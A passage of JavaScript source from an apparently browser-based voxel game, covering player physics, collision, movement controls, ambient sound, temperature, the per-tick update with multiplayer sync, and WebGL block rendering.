        if (collided(x, y, z, null, null, vz, block[3],block[4],steps)) {
          if (p.canStepZ && !world.getBlock(block[0], block[1] + 1, block[2], d) && !world.getBlock(block[0], block[1] + 2, block[2], d)) {
            continue
          }
					hasCollided = true
          if(blockData[block[3]].bounciness){
						thispush -= (VZ*steps-thispush)*blockData[block[3]].bounciness
          }
					maxpushZ = max(maxpushZ,thispush)
					minpushZ = min(minpushZ,thispush)
          /*if(block[4] && block[4].velz){
            if(block[4].velz < 0 && vel.z > block[4].velz) vel.z = block[4].velz
            if(block[4].velz > 0 && vel.z < block[4].velz) vel.z = block[4].velz
          }*/
          //break
        }
        if (sneakLock && onBox(block[0], block[1], block[2], 1, 1, 1)) {
          sneakSafe = true
        }
      }

      if (sneakLock && !sneakSafe) {
        p.z = pz
        vel.z = 0
				hasCollided = true
      }
    }
		
		if(maxpushY || minpushY){
			p.lastY = p.y
			vel.y += maxpushY+minpushY
			p.onGround = false
		}
		if(maxpushX || minpushX){
			vel.x += maxpushX+minpushX
		}
		if(maxpushZ || minpushZ){
			vel.z += maxpushZ+minpushZ
		}
    
    //Minimun height: -40
    if(p.y <= minEntityY){
      p.y = minEntityY
      p.onGround = true
    }

		if (!p.flying) {
			let blockAtFeet = world.getBlock(p2.x, ceil(p.y-p.height*0.5), p2.z, p.dimension)
      if(p.blockHere && blockData[p.blockHere].ladder || blockAtFeet && blockData[blockAtFeet].ladder){
        p.lastY = p.y
        if(controlMap.jump.pressed){
          p.velocity.y = 0.6
        }else if(controlMap.sneak.pressed){
					p.velocity.y = 0
				}else if(!p.onGround && p.velocity.y < 0){
          p.velocity.y *= 0.2
        }
      }
			let drag = liquid ? 0.7 : powder ? 0.2 : spikyBush ? 0.175 : quicksand ? 0.00005 : (p.onGround ? 0.5 : 0.85)
      if(blockData[p.standingOn].slide) drag = blockData[p.standingOn].slide
			p.velocity.z += (p.velocity.z * drag - p.velocity.z)
			p.velocity.x += (p.velocity.x * drag - p.velocity.x)
			p.velocity.y += (p.velocity.y * drag - p.velocity.y)
		} else {
			let drag = 0.85
			p.velocity.z += (p.velocity.z * drag - p.velocity.z)
			p.velocity.x += (p.velocity.x * drag - p.velocity.x)
			p.velocity.y += (p.velocity.y * 0.8 - p.velocity.y)
			if (p.onGround && !p.spectator) {
				p.flying = false
			}
		}
		if(ontouch){
      ontouch(touchX, touchY, touchZ, p.dimension)
    }

		contacts.clear()
    if(p.spectator && p.spectating){
      let s = p.spectating
      p.x = s.x
      p.y = s.y
      p.z = s.z
      p.velocity.x = p.velocity.y = p.velocity.z = 0
			p.previousX = s.previousX, p.previousY = s.previousY, p.previousZ = s.previousZ
      goToDimension(s.dimension)
      switch(s.type){
        case "Player":
          p.walking = s.walking
          p.sprinting = s.sprinting
          p.sneaking = s.sneaking
          p.eating = s.eating
          p.swimming = s.swimming
					if(p.scale !== s.scale) pSetScale(s.scale)
          break
      }
      harmEffect = s.harmEffect || 0
			damageX = damageY = damageZ = 0
    }else if(p.riding){
			let ent = p.ridingEnt
			p.x = ent.x+ent.rideOffsetX
      p.y = ent.y+p.height*0.5+ent.rideOffsetY
      p.z = ent.z+ent.rideOffsetZ
			goToDimension(ent.dimension)
      p.velocity.x = ent.velx || 0
			p.velocity.y = ent.vely || 0
			p.velocity.z = ent.velz || 0
		}
	}
	let runGravity = function() {
    if(!p.spectator && liquid !== lastLiquid){
      lastLiquid = liquid
      if(liquid && wet){
				let pitch = (1/abs(p.y-p.previousY)*0.05+Math.random()*0.2)/(p.width*0.5)
				if(isFinite(pitch)){//won't play if y stays the same
					playSound("liquid.splash",0,1,1,posSound(p.x,p.y-p.height*0.5,p.z),pitch/*abs(1/(p.velocity.y+1))*/)
					send({type:"playSound", data:"liquid.splash", x:p.x,y:p.y-p.height*0.5,z:p.z,pitch})
				}
        if(!performFast) for(var i=0; i<10; i++){
          world.addParticle(new entities[entityIds.SplashParticle](p.x,p.y-p.height*0.5,p.z),p.dimension)
        }
        send({
          type:"particles", particleType:"SplashParticle",
          x:p.x, y:p.y-p.height*0.5, z:p.z, dimension:p.dimension, amount: 10
        })
      }
    }
    if(p.y > p.lastY) p.lastY = p.y
    
    if(p.flying) return
		if(p.onGround) {
      let fall = (p.lastY - p.y) / p.scale
			p.lastY = p.y
      let block = p.standingOn
      if(fall > 0.5 && block){
        blockParticles(block, p.x,p.y-p.height*0.5,p.z,10, "player",world, p.dimension)
        blockSound(block, "step", p.x,p.y-p.height*0.5,p.z)
      }
			if(controlMap.jump.pressed) {
				p.velocity.y = p.jumpSpeed*p.scale
				p.onGround = false
				blockSound(block, "step", p.x,p.y-p.height*0.5,p.z)
				send({type:"jump"})
			}
		}
		if (liquid){
			//p.jumpSpeed = 0.135;
			if (controlMap.jump.pressed){
				p.velocity.y += 0.125
			}
			if (controlMap.sneak.pressed){
				p.velocity.y -= 0.125
			}
		}
		if(powder){
			if(controlMap.jump.pressed) p.velocity.y += 0.13
		}
    p.velocity.y += p.gravityStength
	}
  /*function pushByPlayer(ent){
    let w = p.w, d = p.w
    let w2 = ent.w, d2 = ent.w
    let w3 = (w+w2)**2, d3 = (d+d2)**2
    if(p.x-w<ent.x+w2 && p.x+w>ent.x-w2 && p.z-d<ent.z+d2 && p.z+d>ent.z-d2 && p.y-p.bottomH<ent.y+ent.topH && p.y+p.topH>ent.y-ent.bottomH){
			let velx = p.x-ent.x
      let velz = p.z-ent.z
      if(velx === 0 && velz === 0) return
			let mag = sqrt(velx*velx+velz*velz)
			let push = 1-sqrt(velx*velx/w3+velz*velz/d3)
      velx = velx/mag*push*(w+w2)/2
      velz = velz/mag*push*(d+d2)/2
      p.velocity.x += velx, p.velocity.z += velz
    }
  }*/
  /*function pushByMob(ent){
    let w = p.w, d = p.w
    let w2 = ent.width/2, d2 = ent.depth/2, h2 = ent.height/2
    let w3 = w+w2, d3 = d+d2
    if(p.x-w<ent.x+w2 && p.x+w>ent.x-w2 && p.z-d<ent.z+d2 && p.z+d>ent.z-d2 && p.y-p.bottomH<ent.y+h2 && p.y+p.topH>ent.y-h2){
      let velx = (p.x-ent.x)/w3
      let velz = (p.z-ent.z)/d3
      if(velx === 0 && velz === 0) return
      let mag = sqrt(velx*velx+velz*velz)
      velx = velx/mag/w3/10
      velz = velz/mag/d3/10
      p.velocity.x += velx, p.velocity.z += velz
    }
  }*/
	function pushByMob(ent){
    let w = p.width*0.5, h = p.height*0.5, d = p.depth*0.5
    let w2 = ent.width/2, d2 = ent.depth/2, h2 = ent.height/2
    let w3 = (w+w2)**2, d3 = (d+d2)**2
    if(p.x-w<ent.x+w2 && p.x+w>ent.x-w2 && p.z-d<ent.z+d2 && p.z+d>ent.z-d2 && p.y-h<ent.y+h2 && p.y+h>ent.y-h2){
      let velx = p.x-ent.x
			let velz = p.z-ent.z
      if(velx === 0 && velz === 0) return
			let mag = sqrt(velx*velx+velz*velz)
			let push = 1-sqrt(velx*velx/w3+velz*velz/d3)
      velx = velx/mag*push*(w+w2)/2
      velz = velz/mag*push*(d+d2)/2
      p.velocity.x += velx, p.velocity.z += velz
    }
  }
  
  function defineWorld() {
		let renderStart = performance.now()
    let now = renderStart
    let prx = p.camera.rx, pry = p.camera.ry, pprx = p.camera.prx, ppry = p.camera.pry
    if(p.thirdPerson === "front"){
      p.camera.ry += Math.PI
      p.camera.rx = -p.rx
      p.camera.pry += Math.PI
      p.camera.prx = -p.prx
    }
    p.camera.setDirection()
		blockHere = world.getBlock(round(p.camera.renderX),round(p.camera.renderY),round(p.camera.renderZ), p.dimension) //use round so it works in third person mode
		for(let i=0; i<blockHereEntity.length; i++){
			let ent = blockHereEntity[i]
			ent.show = false
			let x = round(p.camera.renderX+(i&1)-0.5), y = round(p.camera.renderY+((i>>1)&1)-0.5), z = round(p.camera.renderZ+(i>>2)-0.5)
			let block = world.getBlock(x,y,z, p.dimension) //use round so it works in third person mode
			if(!p.spectator && block && !blockData[block].transparent){
				if(ent.block !== block){
					ent.changeBlock(block)
				}
				ent.show = true
				ent.x = x
				ent.y = y
				ent.z = z
			}
		}
		if(tick) updateTextures()
		inLiquid = 0
		if(blockHere && blockData[blockHere].inLiquid) inLiquid = blockData[blockHere].inLiquid
		world.render()
    if(p.thirdPerson === "front"){
      p.camera.rx = prx
      p.camera.ry = pry
      p.camera.prx = pprx
      p.camera.pry = ppry
    }
		calcPd()
		analytics.totalRenderTime += performance.now() - renderStart
	}
  
  const ambientDist = 16
  let blockTempCount = 0, avgBlockTemp = 0
  function updateAmbient(){ //todo: some sounds have different distances you can hear it from
    blockTempCount = 0
    avgBlockTemp = 0
		for(let i in currentAmbientPanner) currentAmbientPanner[i].isCloseEnough = false

		if(!performFast){
			let sections = world.getAmbients(p2.x,p2.y,p2.z,player.dimension)
			for (let section of sections) {
				const {x:sx,y:sy,z:sz} = section
				for (let data of section.ambients) {
					const block = section.pallete[data & 0x1fff]
					const loc = data >> 19 & 0xfff
					const x = (loc & 15) + sx
					const y = (loc >> 4 & 15) + sy
					const z = (loc >> 8 & 15) + sz
					let blockObj = blockData[block]
					let dist = dist3(x,y,z,p.x,p.y,p.z)
					let pos = x+","+y+","+z
					if (block && blockObj.ambientSound) {
						let amount = 1-dist/ambientDist
						if(currentAmbientPanner[pos]){
							let v = currentAmbientPanner[pos]
							v.positionX.value = x
							v.positionY.value = y
							v.positionZ.value = z
							v.theBlock = block
							v.isCloseEnough = true
						}else{
							let v = posSound(x,y,z)
							v.theBlock = block
							v.isCloseEnough = true
							currentAmbientPanner[pos] = v
						}
					}else if(currentAmbientPanner[pos]){
						delete currentAmbientPanner[pos]
					}
					if(block && (blockObj.temperature || blockObj.temperature === 0) && dist < 5){
						let amount = 1-dist/5
						avgBlockTemp += (blockObj.temperature-p.temperature)*amount
						//avgBlockTempDist += dist/5
						blockTempCount += amount
					}
				}
			}
		}
    for(let i in currentAmbient){
      if(!currentAmbientPanner[i] || !currentAmbientPanner[i].isCloseEnough){
        currentAmbient[i].source.stop()
        delete currentAmbient[i]
				delete currentAmbientPanner[i]
      }
    }
    for(let i in currentAmbientPanner){
      let v = currentAmbientPanner[i]
      let blockObj = blockData[v.theBlock]
      if(currentAmbient[i]){
        currentAmbient[i].gain.value = settings.volume*currentAmbient[i].originalVolume
      }else{
        playSound(blockObj.ambientSound, 0, 1, null, v, null, true, (source, gainNode, volume) => {currentAmbient[i] = gainNode; currentAmbient[i].source = source; currentAmbient[i].originalVolume = volume/settings.volume})
      }
    }
    avgBlockTemp /= (blockTempCount||1)
  }
  
  let updtPlayer = function(){
    if(p.ry - p.bodyRot > Math.PI) p.bodyRot += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
    if(p.ry - p.bodyRot < -Math.PI) p.bodyRot -= Math.PId
    if(p.ry - p.bodyRot > Math.PI4) p.bodyRot = lerp(0.75,p.bodyRot,p.ry - Math.PI4)//if rotation difference is too much rotate body
    if(p.ry - p.bodyRot < -Math.PI4) p.bodyRot = lerp(0.75,p.bodyRot,p.ry + Math.PI4)
    
    if(move.z && !move.x) p.bodyRot = lerp(0.4, p.bodyRot, p.ry) //forward and backward
    if(move.x > 0 && !move.z) p.bodyRot = lerp(0.4, p.bodyRot, p.ry-Math.PI4) //right
    if(move.x < 0 && !move.z) p.bodyRot = lerp(0.4, p.bodyRot, p.ry+Math.PI4) //left
    if((move.x > 0 && move.z > 0) || (move.x < 0 && move.z < 0)) p.bodyRot = lerp(0.4, p.bodyRot, p.ry-Math.PI4) //diagnal
    if((move.x < 0 && move.z > 0) || (move.x > 0 && move.z < 0)) p.bodyRot = lerp(0.4, p.bodyRot, p.ry+Math.PI4) //diagnal
    
    if(p.punchEffect > 0) p.bodyRot = lerp(0.4, p.bodyRot, p.ry)
    
    p.camera.previousX = p.camera.x
    p.camera.previousY = p.camera.y
    p.camera.previousZ = p.camera.z
    p.camera.x = p.x+p.cOffsetX
    p.camera.y = p.y+p.cOffsetY
    p.camera.z = p.z+p.cOffsetZ
    p.camera.rx = p.rx
    p.camera.ry = p.ry
    p.camera.prx = p.prx
    p.camera.pry = p.pry
    //p.setRot(p.rx,p.ry,p.bodyRot)
		p.hidden = p.die && p.dieEffect >= 1 || p.spectator
		p.holding = holding || 0
    p.update()
		
    /*if(p.die){
      p.dieEffect += 0.05
      if(p.dieEffect > 1) p.dieEffect = 1
      p.dieRotate = (p.dieEffect**4)*Math.PI2
    }else */if(p.spectator && p.spectating && p.spectating.type === "Player" && p.spectating.die){
			p.dieEffect = p.spectating.dieEffect
      p.dieRotate = (p.dieEffect**4)*Math.PI2
		}//else p.dieEffect = p.dieRotate = 0
  }

	let controls = function() {
    p.prx = p.rx
    p.pry = p.ry
    p.camera.pDamagerz = p.camera.damagerz
    p.camera.pDamagerx = p.camera.damagerx
		move.x = 0
		move.z = 0
    
    if(!p.sitting){
      if(controlMap.forward.pressed) move.z += p.speed*p.scale
      if(controlMap.backward.pressed) move.z -= p.speed*p.scale
      if(controlMap.left.pressed) move.x += p.speed*p.scale
      if(controlMap.right.pressed) move.x -= p.speed*p.scale
			if(pTouch.joystickY) move.z += pTouch.joystickY * p.speed*p.scale
			if(pTouch.joystickX) move.x += pTouch.joystickX * p.speed*p.scale
      if (p.flying) {
        if(controlMap.jump.pressed) p.velocity.y += 0.09*p.scale
        if(controlMap.sneak.pressed) p.velocity.y -= 0.09*p.scale
      }
    }
		if(Key.arrowleft) p.ry -= 0.1
		if(Key.arrowright) p.ry += 0.1
		if(Key.arrowup) p.rx += 0.1
		if(Key.arrowdown) p.rx -= 0.1
    p.rx += mmoveX
    p.ry += mmoveY
    if(mmoveX || mmoveY) p.lastActive = now
    if(p.spectateRemoteControl){
			multiplayer.mmoveX += mmoveX
			multiplayer.mmoveY += mmoveY
		}
		mmoveX = mmoveY = 0

		if (!p.sprinting && controlMap.sprint.pressed && !p.sneaking && controlMap.forward.pressed) {
			p.camera.FOV(settings.fov + 10, 125)
			p.sprinting = true
		}

		if(p.sprinting && p.food > 6) {
			move.x *= p.sprintSpeed
			move.z *= p.sprintSpeed
		}
		if(p.flying) {
			move.x *= p.flySpeed
			move.z *= p.flySpeed
		}
		if (!move.x && !move.z) {
			if (p.sprinting) {
				p.camera.FOV(settings.fov, 125)
			}
			p.sprinting = false
		} else if(abs(move.x) > 0 && abs(move.z) > 0) {
			//move.x *= move.ang
			//move.z *= move.ang
			let mag = sqrt(move.x*move.x+move.z*move.z)
			if(mag > 1) move.x /= mag, move.z /= mag
		}
		
		p.walking = (move.x || move.z) && true
		if(p.walking) p.lastActive = now
		if(world.isMK){
			//Update the velocity, rather than the position.
			let co = cos(p.ry)
			let si = sin(p.ry)
			let speedFactor = blockData[p.standingOn].speedFactor
			let friction = liquid ? (p.swimming ? 1 : 0.4) : (p.onGround ? 1 : 0.3)
			if(speedFactor){
				friction *= speedFactor
			}
			if(p.swimming && liquid){
				let d = p.direction
				p.velocity.x += (d.x * move.z) * friction
				if(p.inLiquid || d.y < 0) p.velocity.y += (d.y * move.z) * friction - p.gravityStength
				p.velocity.z += (d.z * move.z) * friction
			}else{
				p.velocity.x += (co * move.x - si * move.z) * friction
				p.velocity.z += (si * move.x + co * move.z) * friction
			}
		}

    if(p.spectator && p.spectating){
      let s = p.spectating
      switch(s.type){
        case "Player":
          p.rx = -s.rx
          p.ry = -s.ry
          break
        default:
          p.rx = -s.yaw
          p.ry = -s.pitch
      }
    }else if(p.riding){
			let ent = p.ridingEnt
			p.ry -= ent.yaw-ent.previousYaw
			p.bodyRot -= ent.yaw-ent.previousYaw
		}

		const TAU = Math.PI * 2
		const PI1_2 = Math.PI / 2
		while(p.ry > TAU) p.ry -= TAU
		while(p.ry < 0)   p.ry += TAU
		if(p.rx > PI1_2)  p.rx = PI1_2
		if(p.rx < -PI1_2) p.rx = -PI1_2
    if(p.ry - p.pry > Math.PI) p.pry += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
    if(p.ry - p.pry < -Math.PI) p.pry -= Math.PId

		let touchBreak = pTouch.touching && pTouch.canDig && Date.now() - pTouch.touchStart > touchMoveLimit
		let holdBlockData = blockData[holding]
		p.usingItem = false
		p.eating = false
    if((controlMap.place.pressed || Key.leftMouse && Key.control || touchBreak) && holding){
      let item = inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]]
			p.usingItem = true
      if(holdBlockData.edible && (holdBlockData.item || !hitBox.pos) && (holdBlockData.eatWhenFull || !p.survival || p.food < 20)){
				p.eating = true
				if(now - eatSoundTimer > 250){
					eatSoundTimer = now
					eatSound()
					blockParticles(holding,p.x,p.y,p.z,8, "eating", world, p.dimension)
				}
				/*if(time > 1610){
					p.eating = false
					p.food += block.food
					p.foodSaturation += block.saturation
					if(p.survival && inventory.hotbar[inventory.hotbarSlot]){
						inventory.hotbar[inventory.hotbarSlot].amount --;
						if(block.eatResult && !newInvItem(blockIds[block.eatResult])) {
							world.addItems(p.x,p.y,p.z,p.dimension,0,0,0,blockIds[block.eatResult])
						}
						updateHUD = true
					}
					if(p.food >= 20){
						playSound("random.burp")
						send({type:"playSound", data:"random.burp", x:p.x,y:p.y,z:p.z})
					}
				}*/
			}
    }
		if (((controlMap.break.pressed && !Key.control) || touchBreak) && !p.eating && p.lastBreak < Date.now() - 250 && screen === "play" && !p.survival && !entHitbox.ent) { // survival breaking isn't instant
			changeWorldBlock()
		}
		if ((controlMap.place.pressed || Key.leftMouse && Key.control) && p.lastPlace < Date.now() - 250 && !p.autoBuild) {
			newWorldBlock()
		}
		if (((controlMap.break.pressed && !Key.control) || touchBreak) && !p.eating && p.autoBreak) {
			changeWorldBlock()
		}
		if ((controlMap.place.pressed || Key.leftMouse && Key.control) && p.autoBuild) {
			newWorldBlock()
		}
	}

	function chunkHereLoaded(){
		if(!inWorld) return
		const chunkHere = world.getChunk(round(p.x),round(p.z),p.dimension)
		return chunkHere && chunkHere.loaded
	}
  function doTick(){
		let doPhysics = screen !== "loading" && screen !== "netherLoading" && screen !== "endLoading" && screen !== "sleep" && screen !== "dead" && chunkHereLoaded()

    let dnow = Date.now()
    
		//if you change this, also change player entity
    if(p.sneaking || p.eating || p.usingItem && blockData[holding].spyglass){
      p.sprinting = false
      p.speed = p.sneakSpeed
      //if(p.sneaking)p.bottomH = p.sneakBottomH
    }else if(p.sitting){
      p.sneaking = false
      //p.bottomH = p.sitBottomH
    }else if(p.swimming){
      //p.bottomH = p.swimBottomH
    }else if(!p.sprinting){
      p.sneaking = false
      p.speed = p.defaultSpeed
      //p.bottomH = p.defaultBottomH
    }
    if(!p.spectator && p.spectating || p.spectating && p.spectating.type === "Player" && !players[p.spectating.id]){
			p.spectating = null
			p.spectateRemoteControl = false
			pSetScale(1)
		}
		p.ridingEnt = p.riding && getEntityOrPlayer(p.riding)
		if(p.riding && !p.ridingEnt) p.riding = null
    
    let size = inventory.size, s2 = size/2
    for(var i=0; i<9; i++){
      if(!inventory.slots[inventory.slotIds.hotbar[i]]) continue
      let item = inventory.slots[inventory.slotIds.hotbar[i]]
      /*if(!item.amount){
        inventory.hotbar[i] = 0
        updateHUD = true
        continue
      }*/
      if(item.animation > 1){
        item.animation -= 0.15
        if(item.animation < 1) delete item.animation
        updateHUD = true
      }
      /*if(blockData[item.id].durability){
        if(typeof item.durability !== "number"){
          item.durability = blockData[item.id].durability
        }else if(item.durability <= 0){
          inventory.hotbar[i] = 0
          playSound("random.break")
          send({type:"playSound", data:"random.break", x:p.x,y:p.y,z:p.z})
          updateHUD = true
          continue
        }
      }*/
      
      let x = width / 2 - 9 / 2 * inventory.size + (i + 0.5) * inventory.size + 25
      let y = height - inventory.size
      if(touchScreen && mouseX>x-s2 && mouseY>y-s2 && mouseX<x+s2 && mouseY<y+s2){ //drop item
        if(pTouch.onHotbar){
          if(item.dropStart){
            if(dnow - item.dropStart > 500){
              delete item.dropStart
							keydown({type:"controlName",key:"dropItem"})
							keyup({type:"controlName",key:"dropItem"})
            }
          }else{
            item.dropStart = dnow
          }
        }else if(item.dropStart) delete item.dropStart
      }
    }
		holding = inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]]
		holding = holding ? holding.id : 0
		
		p.prevUsingSpyglass = p.usingSpyglass
		p.usingSpyglass = false
		if(controlMap.place.pressed && holding && blockData[holding].spyglass){
			p.spyglassTimer = Date.now() - p.spyglassStart
			p.usingSpyglass = p.spyglassTimer < 60000
		}
		if(!p.prevUsingSpyglass && p.usingSpyglass){
			p.camera.FOV(settings.fov/10, 300)
			playSound("spyglass.use")
			if(multiplayer) send({type:"playSound", data:"spyglass.use", x:p.x,y:p.y,z:p.z})
		}else if(p.prevUsingSpyglass && !p.usingSpyglass){
			p.camera.FOV(settings.fov, 300)
			playSound("spyglass.stop")
			if(multiplayer) send({type:"playSound", data:"spyglass.stop", x:p.x,y:p.y,z:p.z})
		}

    p.standingOn = world.getBlock(p2.x,floor(p.y-p.height*0.5),p2.z, p.dimension)
		p.blockHere = world.getBlock(round(p.x), round(p.y), round(p.z), p.dimension)
		p.inLiquid = 0
		if(p.blockHere && blockData[p.blockHere].inLiquid) p.inLiquid = blockData[p.blockHere].inLiquid
		if(p.prevInLiquid !== p.inLiquid){
			if(p.inLiquid === blockData[blockIds.Water].inLiquid){
				playSound("liquid.enter", 0,1,1, posSound(p.x,p.y,p.z))
     		send({type:"playSound", data:"liquid.enter", x:p.x,y:p.y,z:p.z})
			}else if(p.prevInLiquid === blockData[blockIds.Water].inLiquid){
				playSound("liquid.exit", 0,1,1, posSound(p.x,p.y,p.z))
     		send({type:"playSound", data:"liquid.exit", x:p.x,y:p.y,z:p.z})
			}
			p.prevInLiquid = p.inLiquid
		}
    
    controls()
    if(doPhysics && world.isMK) runGravity()
    if(!p.spectator && !p.die){
      for(let i in players){
        let P = players[i]
        if(!P.hidden && !P.die && P.dimension === p.dimension) pushByMob(P)
      }
			let nearEntities = world.getEntitiesNear(p.x,p.y,p.z,p.dimension,1)
      for(let ent of nearEntities){
        if(ent.pushes && ent.dimension === p.dimension) pushByMob(ent)
      }
    }
    
    if(p.survival) cracks()
    
    /*if(now - lastHeal > healTime) {
      lastHeal = now
      if(p.health < 20){
        p.health += 1
        healEffect = 40
        updateHUD = true
      }
    }*/
    
    if(p.survival){
      if(p.foodSaturation <= 0 || p.foodJitter > -1){
        p.foodJitter ++
        if(p.foodJitter > 20) p.foodJitter = -1
        if(p.foodJitter <= 1) updateHUD = true
      }else{
        p.foodJitter = -1
      }
    }

    if(p.inLiquid && p.sprinting && !p.swimming && !p.flying){
      p.swimming = true
      //p.bottomH = p.swimBottomH
    }else if((!liquid || !p.walking) && p.swimming && !blockData[world.getBlock(p2.x,p2.y+1,p2.z)].solid){
      p.swimming = false
      //p.bottomH = p.defaultBottomH
			p.y += p.defaultBottomH-p.swimBottomH
    }
    
    if(harmEffect > 0){
      harmEffect -= 3
			let amount = (max(harmEffect-15,0) / 15)**2 / 8
			if(damageX || damageY || damageZ){
				p.camera.damagerz = -(damageX*p.direction.z + damageZ*-p.direction.x)
				p.camera.damagerx = -(damageX*p.direction.x + damageZ*p.direction.z)
				let mag = sqrt(p.camera.damagerz*p.camera.damagerz+p.camera.damagerx*p.camera.damagerx)/amount
				p.camera.damagerz /= mag, p.camera.damagerx /= mag
				if(!p.camera.damagerz && !p.camera.damagerx){
					p.camera.pDamagerz = p.camera.damagerz
					p.camera.pDamagerx = p.camera.damagerx
				}
			}else{
      	p.camera.damagerz = amount
			}
      p.harmEffect = harmEffect
      updateHUD = true
    }else{
      p.camera.damagerz = p.camera.damagerx = 0
    }
    if(healEffect > 0){
      healEffect -= 4
      updateHUD = true
    }
    if(loseHealthEffect > 0){
      loseHealthEffect -= 4
      updateHUD = true
    }
    if(p.punchEffect > 0){
      p.punchEffect -= 0.75
    }
    if(p.punchEffect < 0) p.punchEffect = 0
		if(portalFadeOutEffect > 0){
			portalFadeOutEffect -= 2
			portalEffect = portalFadeOutEffect
			updateHUD = true
		}else if(portalEffect > 0){
			portalEffect -= 1.25
			updateHUD = true
			/*fill(255,0,255, portalEffect)
			ctx.fillRect(0,0,width,height)*/
			//portal texture update in updateTextures
			//code in hud
		}

    world.tick()
    setCameraOffset()
    
    let pTouchingPortal = touchingPortal
    touchingPortal = false
    if(doPhysics){
			p.previousX = p.x
			p.previousY = p.y
			p.previousZ = p.z
			p.lastUpdate = now
			
			if(world.isMK) resolveContactsAndUpdatePosition(now)
			else world.playerPhysics()
			
			lookingAt()
			if(listener){
		    let pd = p.direction
		    listener.positionX.value = p.x+p.cOffsetX
		    listener.positionY.value = p.y+p.cOffsetY
		    listener.positionZ.value = p.z+p.cOffsetZ
		    listener.forwardX.value = pd.x
		    listener.forwardY.value = pd.y
		    listener.forwardZ.value = pd.z
		    let up = getRotation(p.rx+Math.PI2,p.ry)
		    listener.upX.value = up.x
		    listener.upY.value = up.y
		    listener.upZ.value = up.z
			}
		}
    updtPlayer()

		p2.x = round(p.x)
	  p2.y = round(p.y)
		p2.z = round(p.z)
    p3.x = p.x
    p3.y = p.y
    p3.z = p.z
		p3.dimension = p.dimension
    p3.ry = p.ry
    p3.rx = p.rx
    p3.bodyRot = p.bodyRot
    p3.sneaking = p.sneaking
    p3.username = p.username
    p3.harmEffect = harmEffect
    p3.crackPos = hitBox.pos
    p3.crack = crack.idx
    p3.burning = p.burning
    p3.holding = holding || 0
    p3.walking = p.walking
    p3.eating = p.eating
    p3.sprinting = p.sprinting
    p3.punchEffect = p.punchEffect
    p3.sleeping = p.sleeping
    p3.sitting = p.sitting
    p3.swimming = p.swimming
    p3.usingItem = p.usingItem
    p3.hidden = p.hidden
    p3.spectating = p.spectating && p.spectating.id || null
		p3.scale = p.scale
		p3.velx = p.velocity.x
		p3.vely = p.velocity.y
		p3.velz = p.velocity.z
		p3.die = p.die
		p3.riding = p.riding
		p3.onGround = p.onGround
		p3.flying = p.flying
    
    if(!pTouchingPortal && touchingPortal){
      if(portalTriggerSound){
        portalTriggerSound.stop()
      }
      playSound("portal.trigger", 0, 0.01, null, null, false, portalTriggerSoundStart)
    }
    if(portalTriggerSoundGain){
      portalTriggerSoundGain.gain.value = portalEffect / 100
    }
    
    //Temperature calculation
    let biome = world.getBiome(p2.x,p2.y,p2.z, p.dimension)
    let temp = getBiomeTemperature(biome,p.y)*10
		{
			//Darker places are colder
			const skysLight = world.getLight(p2.x, p2.y, p2.z, 0, p.dimension)
			const lightLevel = min(skysLight * skyLight / 15, 1.0)
			temp -= (1 - lightLevel) * 4
			
			//if(blockTempCount) temp = lerp(avgBlockTempDist, avgBlockTemp, temp)
			temp += avgBlockTemp
			
			if(p.burning){
				temp = lerp(p.burnTimer / 16, temp, 25)
			}
			if(freezeEffect > 0){
				temp = lerp(freezeEffect / 140, temp, 0)
			}else if(wet){
				temp -= 2
			}
			
			p.temperature = lerp(0.015625,p.temperature,temp)
			if(p.lastTemperature !== round(p.temperature) || p.temperature>19 || p.temperature<1){
				p.lastTemperature = round(p.temperature)
				updateHUD = true
			}
		}
    
    var b = world.getBiome(p2.x,p2.y,p2.z, p.dimension)
    getBiomeSkyColor(b,defaultSkySolid)
		defaultSky[0] = lerp(0.125,defaultSky[0],defaultSkySolid[0])
		defaultSky[1] = lerp(0.125,defaultSky[1],defaultSkySolid[1])
		defaultSky[2] = lerp(0.125,defaultSky[2],defaultSkySolid[2])
    if(inLiquid === 1){
      var w = blockData[blockIds.Water]
      var t = w.tint[b] || w.tint.default
			if(prevInLiquid === inLiquid){
				waterFogColor[0] = lerp(0.125,waterFogColor[0],t[0])
				waterFogColor[1] = lerp(0.125,waterFogColor[1],t[1])
				waterFogColor[2] = lerp(0.125,waterFogColor[2],t[2])
			}else{
				waterFogColor[0] = t[0], waterFogColor[1] = t[1], waterFogColor[2] = t[2]
			}
    }
		prevInLiquid = inLiquid
    if(p.health < 5) updateHUD = true //for hearts shaking
    updateAmbient()

		if(!cheats && blockMode) blockMode = CUBE

    if(inventory.showName > 0){
      inventory.showName -= 0.06
      updateHUD = true
    }
    
    if(p.walking && p.onGround){
      let limit = 500//437.5
      if(p.sprinting) limit = 250
      if(now - lastStepSound > limit){
        lastStepSound = now
				let blockAtFeet = world.getBlock(p2.x, ceil(p.y-p.height*0.5), p2.z, p.dimension)
				if(blockAtFeet && blockData[blockAtFeet].stepSound){
        	blockSound(blockAtFeet, "step", p.x,ceil(p.y-p.height*0.5),p.z)
        	blockSound(p.standingOn, "lowStep", p.x,p.y-p.height*0.5,p.z)
				}else{
        	blockSound(p.standingOn, "step", p.x,p.y-p.height*0.5,p.z)
				}
        if(p.sprinting) blockParticles(p.standingOn, p.x,p.y-p.height*0.5,p.z,10, "player",world, p.dimension)
      }
    }
		if(host) serverWorld.tick()
    
    if(multiplayer && multiplayer.sendPos) multiplayer.sendPos()
    if(typeof win.eachTick === "function") win.eachTick()
  }

	function box2(sides, tex, shape) {
		if (blockFill && !shape) {
			let i = 0
			for (let side in Block) {
				if (sides & Block[side]) {
					vertexAttribPointer("aVertex", program3D, "aVertex", 3, sideEdgeBuffers[Sides[side]])
					vertexAttribPointer("aTexture", program3D, "aTexture", 2, texCoordsBuffers[textureMap[tex[i]]])
					gl.disableVertexAttribArray(glCache.aSkylight)
					gl.disableVertexAttribArray(glCache.aBlocklight)
					gl.disableVertexAttribArray(glCache.tint)
					gl.disableVertexAttribArray(glCache.aShadow)
					gl.vertexAttrib1f(glCache.aSkylight, 1.0)
					gl.vertexAttrib1f(glCache.aBlocklight, 1.0)
					gl.vertexAttrib1f(glCache.aShadow, 1.0)
					gl.drawElements(gl.TRIANGLES, 6, gl.UNSIGNED_INT, 0)
				}
				i++
			}
		}/*else if(shape){
			for (let i = 0; i < shape.size; i++) {
        vertexAttribPointer("aVertex", program3D, "aVertex", 3, shape.buffer)
